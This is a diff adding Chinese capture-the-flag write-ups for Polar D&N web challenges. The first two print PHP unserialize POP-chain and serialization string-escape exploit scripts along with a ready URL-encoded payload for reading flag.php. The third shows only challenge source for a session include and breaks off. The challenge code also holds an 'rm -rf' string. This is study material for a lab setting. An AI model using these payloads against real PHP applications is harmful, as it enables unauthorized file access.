@@ -78,3 +78,236 @@ new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(new 
 
 非常经典的链式调用;
 
+## [Polar WEB] 苦海
+
+### 题解
+
+开门源码:
+
+```php
+ <?php
+/*
+PolarD&N CTF
+*/
+error_reporting(1);
+
+class User
+{
+    public $name = 'PolarNight';
+    public $flag = 'syst3m("rm -rf ./*");';
+
+    public function __construct()
+    {
+        echo "删库跑路，蹲监狱~";
+    }
+
+    public function printName()
+    {
+        echo $this->name;
+        return 'ok';
+    }
+
+    public function __wakeup()
+    {
+        echo "hi, Welcome to Polar D&N ~ ";
+        $this->printName();
+    }
+
+    public function __get($cc)
+    {
+        echo "give you flag : " . $this->flag;
+    }
+}
+
+class Surrender
+{
+    private $phone = 110;
+    public $promise = '遵纪守法，好公民~';
+
+    public function __construct()
+    {
+        $this->promise = '苦海无涯，回头是岸！';
+        return $this->promise;
+    }
+
+    public function __toString()
+    {
+        return $this->file['filename']->content['title'];
+    }
+}
+
+class FileRobot
+{
+    public $filename = 'flag.php';
+    public $path;
+
+    public function __get($name)
+    {
+        $function = $this->path;
+        return $function();
+    }
+
+    public function Get_file($file)
+    {
+        $hint = base64_encode(file_get_contents($file));
+        echo $hint;
+    }
+
+    public function __invoke()
+    {
+        $content = $this->Get_file($this->filename);
+        echo $content;
+    }
+}
+
+if (isset($_GET['user'])) {
+    unserialize($_GET['user']);
+} else {
+    $hi = new  User();
+    highlight_file(__FILE__);
+} 
+```
+
+反序列化, 调用链:
+
+```
+User.__wakeup -> User.printName -> Surrender.__toString -> FileRobot.__get -> FileRobot.__invoke -> FileRobot.Get_file
+```
+
+exp:
+
+```php
+<?php
+class User
+{
+    public $name;
+}
+ 
+class Surrender
+{
+}
+ 
+class FileRobot
+{
+    public $filename;
+    public $path;
+}
+ 
+$d=new FileRobot();
+$c=new FileRobot();
+$b=new Surrender();
+$a=new User();
+$d->filename='../flag.php';
+$c->path=$d;
+$b->file['filename']=$c;
+$a->name=$b;
+echo serialize($a);
+```
+
+payload:
+```
+(GET)
+?user=O%3A4%3A"User"%3A1%3A{s%3A4%3A"name"%3BO%3A9%3A"Surrender"%3A1%3A{s%3A4%3A"file"%3Ba%3A1%3A{s%3A8%3A"filename"%3BO%3A9%3A"FileRobot"%3A2%3A{s%3A8%3A"filename"%3BN%3Bs%3A4%3A"path"%3BO%3A9%3A"FileRobot"%3A2%3A{s%3A8%3A"filename"%3Bs%3A11%3A"..%2Fflag.php"%3Bs%3A4%3A"path"%3BN%3B}}}}}
+```
+
+![13-1.png](13-1.png)
+
+![13-2.png](13-2.png)
+
+## [Polar WEB] 你想逃也逃不掉
+
+### 题解
+
+还是开门源码:
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+function filter($string){
+    return preg_replace( '/phtml|php3|php4|php5|aspx|gif/','', $string);
+}
+$user['username'] = $_POST['name'];
+$user['passwd'] = $_GET['passwd'];
+$user['sign'] = '123456';
+
+$ans = filter(serialize($user));
+if(unserialize($ans)[sign] == "ytyyds"){
+    echo file_get_contents('flag.php');
+}
+```
+
+这种没有直接用正则把 payload 杀掉, 而是使用替换的题一般都是字符串逃逸:
+
+这里对输入先序列化再过滤, 之后再反序列化, 注意这个顺序, 通过调整 payload, 让 passwd 去污染原有序列, 然后让 username 里的原有内容被 WAF 掉, 多余的空位来指挥 php 读入污染的 passwd;
+
+exp:
+
+```php
+
+<?php
+function filter($string){
+    return preg_replace( '/phtml|php3|php4|php5|aspx|gif/','', $string);
+}
+
+class user{
+    public $username;
+    public $passwd;
+    public $sign;
+
+}
+
+$user['username'] = "phtmlphtmlphtmlphtml"; # 20 个字符
+$user['passwd'] = ";s:6:\"passwd\";s:0:\"\";s:4:\"sign\";s:6:\"ytyyds\";}";
+$user['sign'] = '123456';
+
+$a = serialize($user);
+echo 'serialized: '.$a;
+echo "\n";
+
+$ans = filter($a);
+echo 'filtered: '.$ans;
+echo "\n";
+
+$b = unserialize($ans);
+echo 'unserialized: '.$b;
+echo "\n";
+
+# 需要逃逸: s:6:"passwd";s:46:";
+# 20 个字符, 5 个phtml 即可
+
+if(unserialize($ans)['sign'] == "ytyyds"){
+    echo "bypass";
+}
+```
+
+![14-1.png](14-1.png)
+
+爆出 flag;
+
+这题的关键是通过不直接杀而是替换的 WAF 来联想到**序列化字符串逃逸**, 通过一增一减的方式构造 payload, 具体来说, 尝试构造一个 passwd payload, 然后后推前即可; 多做几道这种题就会快得多;
+
+## [Polar WEB] safe_include
+
+### 题解
+
+开门依然源码:
+
+```php
+<?php 
+show_source(__FILE__); 
+@session_start();
+
+ini_set('open_basedir', '/var/www/html/:/tmp/'); 
+
+$sys = @$_SESSION['xxs'];
+if (isset($_GET['xxs'])) {
+    $sys = $_GET['xxs'];
+}
+
+@include $sys;
+
+$_SESSION['xxs'] = $sys;
+```
+
+## 
